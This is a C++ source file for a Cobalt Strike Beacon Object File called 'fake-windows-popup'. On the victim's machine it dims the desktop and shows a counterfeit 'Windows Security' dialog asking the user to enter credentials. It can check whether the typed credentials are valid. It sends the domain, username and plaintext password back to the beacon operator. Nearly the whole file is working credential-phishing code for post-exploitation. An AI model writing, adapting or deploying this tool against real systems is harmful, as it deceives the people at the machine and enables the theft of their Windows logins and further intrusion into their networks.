#include <beacon.h>
#include <shellapi.h>
#include <windows.h>

#include "app.h"
#include "credentials.h"
#include "dimmer.h"
#include "policy.h"
#include "prompt.h"
#include "target.h"

namespace {

constexpr int kMaximumUiStringBytes = 1024;
constexpr int kMaximumUiStringChars = kMaximumUiStringBytes / sizeof(wchar_t);
constexpr int kMaximumRawArgumentBytes = 4096;

struct SettingsStorage {
    AppSettings value;
    wchar_t caption[kMaximumUiStringChars];
    wchar_t message[kMaximumUiStringChars];
};

void set_default_settings(AppSettings* settings) {
    *settings = {
        L"",
        L"",
        kDefaultTimeoutSeconds,
        kDefaultMaxAttempts,
        false,
        false,
        false,
    };
}

bool read_packed_wide_size(
    const char* data,
    int len,
    int* offset,
    unsigned int* bytes) {
    if (*offset < 0 || *offset > len - 4) {
        return false;
    }
    const auto* current = reinterpret_cast<const unsigned char*>(data + *offset);
    const unsigned int size =
        (static_cast<unsigned int>(current[0]) << 24) |
        (static_cast<unsigned int>(current[1]) << 16) |
        (static_cast<unsigned int>(current[2]) << 8) |
        static_cast<unsigned int>(current[3]);
    if (size < sizeof(wchar_t) || size > kMaximumUiStringBytes ||
        size % sizeof(wchar_t) != 0 ||
        size > static_cast<unsigned int>(len - *offset - 4)) {
        return false;
    }
    const int end = *offset + 4 + static_cast<int>(size);
    if (data[end - 1] != '\0' || data[end - 2] != '\0') {
        return false;
    }
    *offset = end;
    *bytes = size;
    return true;
}

bool looks_like_packed_settings(const char* data, int len) {
    if (data == nullptr || len < 4) {
        return false;
    }
    int offset = 0;
    unsigned int bytes = 0;
    if (!read_packed_wide_size(data, len, &offset, &bytes)) {
        return false;
    }
    if (offset == len) {
        return true;
    }
    if (!read_packed_wide_size(data, len, &offset, &bytes)) {
        return false;
    }
    const int remaining = len - offset;
    return remaining >= 0 && remaining <= 5 * static_cast<int>(sizeof(int)) &&
        remaining % static_cast<int>(sizeof(int)) == 0;
}

bool extract_wide(datap* parser, const wchar_t** value) {
    if (BeaconDataLength(parser) <= 0) {
        return true;
    }
    int bytes = 0;
    auto* extracted = reinterpret_cast<const wchar_t*>(
        BeaconDataExtract(parser, &bytes));
    if (extracted == nullptr || bytes < static_cast<int>(sizeof(wchar_t)) ||
        bytes > kMaximumUiStringBytes ||
        bytes % static_cast<int>(sizeof(wchar_t)) != 0 ||
        extracted[(bytes / static_cast<int>(sizeof(wchar_t))) - 1] != L'\0') {
        return false;
    }
    *value = extracted;
    return true;
}

bool parse_packed_settings(const char* data, int len, AppSettings* settings) {
    datap parser{};
    BeaconDataParse(&parser, const_cast<char*>(data), len);
    if (!extract_wide(&parser, &settings->caption) ||
        !extract_wide(&parser, &settings->message)) {
        return false;
    }
    if (BeaconDataLength(&parser) >= static_cast<int>(sizeof(int))) {
        settings->timeout_seconds = clamp_timeout_seconds(BeaconDataInt(&parser));
    }
    if (BeaconDataLength(&parser) >= static_cast<int>(sizeof(int))) {
        settings->max_attempts = clamp_max_attempts(BeaconDataInt(&parser));
    }
    if (BeaconDataLength(&parser) >= static_cast<int>(sizeof(int))) {
        settings->validate = normalize_bool(BeaconDataInt(&parser));
    }
    if (BeaconDataLength(&parser) >= static_cast<int>(sizeof(int))) {
        settings->include_password = normalize_bool(BeaconDataInt(&parser));
    }
    if (BeaconDataLength(&parser) >= static_cast<int>(sizeof(int))) {
        settings->persistent = normalize_bool(BeaconDataInt(&parser));
    }
    return BeaconDataLength(&parser) == 0;
}

bool parse_decimal(const wchar_t* value, int* result) {
    if (value == nullptr || result == nullptr || *value == L'\0') {
        return false;
    }
    bool negative = false;
    if (*value == L'-' || *value == L'+') {
        negative = *value == L'-';
        ++value;
    }
    if (*value == L'\0') {
        return false;
    }
    unsigned int number = 0;
    const unsigned int limit = negative ? 2147483648U : 2147483647U;
    while (*value != L'\0') {
        if (*value < L'0' || *value > L'9') {
            return false;
        }
        const unsigned int digit = static_cast<unsigned int>(*value - L'0');
        if (number > (limit - digit) / 10U) {
            return false;
        }
        number = number * 10U + digit;
        ++value;
    }
    if (negative) {
        *result = number == 2147483648U
            ? (-2147483647 - 1)
            : -static_cast<int>(number);
    } else {
        *result = static_cast<int>(number);
    }
    return true;
}

bool copy_wide_argument(
    const wchar_t* source,
    wchar_t* destination,
    unsigned int capacity) {
    if (source == nullptr || destination == nullptr || capacity == 0) {
        return false;
    }
    unsigned int index = 0;
    while (source[index] != L'\0') {
        if (index + 1 >= capacity) {
            destination[0] = L'\0';
            return false;
        }
        destination[index] = source[index];
        ++index;
    }
    destination[index] = L'\0';
    return true;
}

bool parse_raw_settings(
    const char* data,
    int len,
    SettingsStorage* storage) {
    int raw_bytes = 0;
    while (raw_bytes < len && raw_bytes <= kMaximumRawArgumentBytes &&
           data[raw_bytes] != '\0') {
        ++raw_bytes;
    }
    if (raw_bytes == 0) {
        return true;
    }
    if (raw_bytes > kMaximumRawArgumentBytes) {
        return false;
    }

    constexpr wchar_t prefix[] = L"fake-windows-popup ";
    constexpr int command_line_capacity = kMaximumRawArgumentBytes + 32;
    auto* command_line = static_cast<wchar_t*>(HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        command_line_capacity * sizeof(wchar_t)));
    if (command_line == nullptr) {
        return false;
    }
    int prefix_chars = 0;
    while (prefix[prefix_chars] != L'\0') {
        command_line[prefix_chars] = prefix[prefix_chars];
        ++prefix_chars;
    }
    const int converted = MultiByteToWideChar(
        CP_ACP,
        MB_ERR_INVALID_CHARS,
        data,
        raw_bytes,
        command_line + prefix_chars,
        command_line_capacity - prefix_chars - 1);
    if (converted <= 0) {
        HeapFree(GetProcessHeap(), 0, command_line);
        return false;
    }
    command_line[prefix_chars + converted] = L'\0';

    int argc = 0;
    wchar_t** argv = CommandLineToArgvW(command_line, &argc);
    HeapFree(GetProcessHeap(), 0, command_line);
    if (argv == nullptr) {
        return false;
    }
    const int supplied = argc - 1;
    const bool shorthand = supplied == 4 || supplied == 5;
    const bool full = supplied == 6 || supplied == 7;
    if (!shorthand && !full) {
        LocalFree(argv);
        return false;
    }

    int first_number = 1;
    if (full) {
        if (!copy_wide_argument(argv[1], storage->caption, kMaximumUiStringChars) ||
            !copy_wide_argument(argv[2], storage->message, kMaximumUiStringChars)) {
            LocalFree(argv);
            return false;
        }
        storage->value.caption = storage->caption;
        storage->value.message = storage->message;
        first_number = 3;
    }

    int values[5]{};
    const int number_count = supplied - (first_number - 1);
    for (int index = 0; index < number_count; ++index) {
        if (!parse_decimal(argv[first_number + index], &values[index])) {
            LocalFree(argv);
            return false;
        }
    }
    LocalFree(argv);

    storage->value.timeout_seconds = clamp_timeout_seconds(values[0]);
    storage->value.max_attempts = clamp_max_attempts(values[1]);
    storage->value.validate = normalize_bool(values[2]);
    storage->value.include_password = normalize_bool(values[3]);
    if (number_count == 5) {
        storage->value.persistent = normalize_bool(values[4]);
    }
    return true;
}

bool parse_settings(const char* data, int len, SettingsStorage* storage) {
    set_default_settings(&storage->value);
    if (data == nullptr || len <= 0) {
        return true;
    }
    if (looks_like_packed_settings(data, len)) {
        return parse_packed_settings(data, len, &storage->value);
    }
    return parse_raw_settings(data, len, storage);
}

bool append_wide(
    wchar_t* destination,
    unsigned int capacity,
    unsigned int* length,
    const wchar_t* source) {
    while (*source != L'\0') {
        if (*length + 1 >= capacity) {
            destination[0] = L'\0';
            return false;
        }
        destination[(*length)++] = *source++;
    }
    destination[*length] = L'\0';
    return true;
}

bool build_default_message(
    const TargetInfo& target,
    wchar_t* message,
    unsigned int capacity) {
    unsigned int length = 0;
    return append_wide(
               message,
               capacity,
               &length,
               L"Enter your credentials to connect to: ") &&
           append_wide(message, capacity, &length, target.prompt_target);
}

void print_identity(const Credentials& credentials) {
    if (credentials.domain[0] != L'\0') {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[+] Identity: %ls\\%ls\n",
            credentials.domain,
            credentials.username);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Identity: %ls\n", credentials.username);
    }
}

void print_credentials(const Credentials& credentials, bool include_password) {
    print_identity(credentials);
    if (include_password) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Password: %ls\n", credentials.password);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Password output suppressed\n");
    }
}

}  // namespace

extern "C" __declspec(dllexport) void go(const char* data, int len) {
    BEACON_INIT;

    SettingsStorage storage{};
    if (!parse_settings(data, len, &storage)) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[-] Invalid arguments; expected packed ZZiiiii or raw: [caption message] timeout attempts validate include-password [persistent]\n");
        return;
    }
    const AppSettings& settings = storage.value;

    DWORD process_session = static_cast<DWORD>(-1);
    ProcessIdToSessionId(GetCurrentProcessId(), &process_session);
    const DWORD console_session = WTSGetActiveConsoleSessionId();

    TargetInfo target{};
    DWORD error_code = ERROR_SUCCESS;
    if (!resolve_target(&target, &error_code)) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[-] Unable to resolve prompt target (error=%u)\n",
            error_code);
        return;
    }

    wchar_t generated_message[512]{};
    const wchar_t* caption = settings.caption[0] == L'\0'
        ? L"Windows Security"
        : settings.caption;
    const wchar_t* message = settings.message;
    if (message[0] == L'\0') {
        if (!build_default_message(
                target,
                generated_message,
                static_cast<unsigned int>(sizeof(generated_message) / sizeof(generated_message[0])))) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Generated prompt message is too long\n");
            return;
        }
        message = generated_message;
    }

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[*] Starting credential prompt for %ls (timeout=%u, attempts=%u, validation=%s, persistent=%s, session=%u, console-session=%u)\n",
        target.prompt_target,
        settings.timeout_seconds,
        settings.max_attempts,
        settings.validate ? "on" : "off",
        settings.persistent ? "on" : "off",
        process_session,
        console_session);

    DimmerWindow dimmer;
    if (!dimmer.start(&error_code)) {
        if (error_code == ERROR_HOTKEY_ALREADY_REGISTERED) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[-] Emergency hotkey is already registered; another fake-windows-popup instance may still be running (error=%u)\n",
                error_code);
            return;
        }
        BeaconPrintf(
            CALLBACK_ERROR,
            "[-] Unable to create desktop dimmer (error=%u)\n",
            error_code);
        return;
    }
    if (!dimmer.foreground_activated()) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[*] Foreground activation denied; dimmer demoted below topmost windows\n");
    }

    Credentials credentials;
    const PromptResult result = run_prompt(
        dimmer.hwnd(),
        dimmer.cancel_event(),
        caption,
        message,
        settings,
        target,
        &credentials,
        &error_code);
    dimmer.stop();

    if (result == PromptResult::captured || result == PromptResult::validated) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            result == PromptResult::validated
                ? "[+] Credential validated\n"
                : "[+] Credential captured without validation\n");
        print_credentials(credentials, settings.include_password);
    } else if (result == PromptResult::cancelled) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Credential prompt cancelled\n");
    } else if (result == PromptResult::timed_out) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Credential prompt timed out\n");
    } else if (result == PromptResult::attempts_exhausted) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[-] Credential validation failed after %u attempt(s) (error=%u)\n",
            settings.max_attempts,
            error_code);
        if (credentials.username[0] != L'\0') {
            print_credentials(credentials, settings.include_password);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Credential prompt failed (error=%u)\n", error_code);
    }

    secure_zero(generated_message, sizeof(generated_message));
}

BEACON_MAIN("ZZiiiii", go)
